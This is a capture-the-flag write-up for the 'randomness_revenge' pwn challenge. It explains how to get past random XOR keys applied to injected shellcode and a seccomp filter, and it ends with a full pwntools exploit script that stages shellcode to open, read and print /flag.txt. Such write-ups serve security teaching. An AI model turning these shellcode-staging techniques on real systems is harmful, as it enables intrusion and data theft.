# Randomness_revenge writeup

## Description

brwook says he doesn't need the offset.

`$ nc 1337.sb 40005`

flag is at `/flag.txt`

**author**: brwook, cocay

## Key Idea

```c
    for (int i = 0; i < num; i++){
        unsigned long key = randnum() << (8 * ((7 - i) % 8));
        printf("> ");
        scanf("%lu", &sc[i+1]);
        sc[i + 1] ^= key;
    }
```

Some random values are applied into our shellcode payload. But, xor logic is quite weak. The number of affected bytes increases from 1. It means that we can control other bytes as we want. Also, by using the affected bytes as operand, we can the control assembly flow more than 7 bytes.

After executing the author-inserted shellcode, the context is like this.

```
 RAX  0xffffd680
 RBX  0x0
 RCX  0xffffd690
 RDX  0xaaaa4680
 RDI  0x7fffffffd680 ◂— 0x30 /* '0' */
 RSI  0x0
 ...
 RBP  0x7fffffffdbe0 ◂— 0x1
 RSP  0x7fffffffdbb8 —▸ 0x55555555562a (main+405) ◂— mov edi, 0
*RIP  0x555555559008 ◂— 0x0


   0x555555559000    xor    eax, edi
   0x555555559002    xor    ecx, edi
   0x555555559004    xor    edx, edi
   0x555555559006    nop    
   0x555555559007    nop    
 ► 0x555555559008    add    byte ptr [rax], al
```

Only RIP register is pointing to a heap address, but it is so expensive to move values from RIP register (e..g `lea rax, [rip]`). We can control 7-bytes at first, and next is 6-bytes, 5-bytes...

At first, I tried to manipulate the address of main function in the RSP and change the flow with `ret (0xc3)` assembly, but that didn't work well.

After some digging, I found that syscall makes context change.

```bash
$ seccomp-tools dump ./randomness_revenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

We can use only 4 syscalls (`read`, `write`, `exit`, `openat`). After using read syscall, the RCX register changes into RIP value.

```
*RAX  0xfffffffffffffff7
 RBX  0x0
*RCX  0x57f66287800c ◂— 0xc0315e5154b3ff31
 RDX  0x96f39ab0
 RDI  0x7ffff4741ab0 ◂— '10416831503315066449'
 RSI  0xa

 RBP  0x7ffff4742010 ◂— 0x1
 RSP  0x7ffff4741fe8 —▸ 0x57f660ed462a (main+405) ◂— mov edi, 0
*RIP  0x57f66287800c ◂— 0xc0315e5154b3ff31

   0x57f662878008    xor    eax, eax
   0x57f66287800a    syscall
 ► 0x57f66287800c    xor    edi, edi

```

From this, we can get heap address through RCX. Also, we can bypass last-affected-byte by using some cheap assembly (e.g. `mov bl, XX`). Lastly, we can use RDX register that has dummy value as size of `read`. That's it.

## Solve script
```python
# author: brwook
from pwn import *

context.arch = 'amd64'

p = process('./randomness_revenge', aslr=1)
# p = remote('pwn.1337.sb', 10005)
shellcode = asm('''
    xor eax, eax
    syscall
    xor edi, edi
    mov bl, 0
''')
# "syscall" makes RCX register into heap address, and idky
# "mov bl, 0" is needed for ignoring last 1-byte

shellcode2 = asm('''
    push rcx
    pop rsi
    xor eax, eax
    syscall
''')
# read(0, heap, dummy size);

shellcode3 = shellcraft.openat(0, "/flag.txt", 0, 0)
shellcode3 += shellcraft.read('rax', 'rsp', 0x40)
shellcode3 += shellcraft.write(1, 'rsp', 0x40)

log.info(f"length of 1st shellcode : {len(shellcode)}")
log.info(f"length of 2nd shellcode : {len(shellcode2)}")
p.sendlineafter(b"number: ", b'2')
p.sendlineafter(b'> ', str(u64(shellcode)).encode())
p.sendlineafter(b'> ', str(u64(shellcode2.ljust(8, b'\x90'))).encode())
p.send(b'\x90' * 0xA + asm(shellcode3))
p.interactive()
```
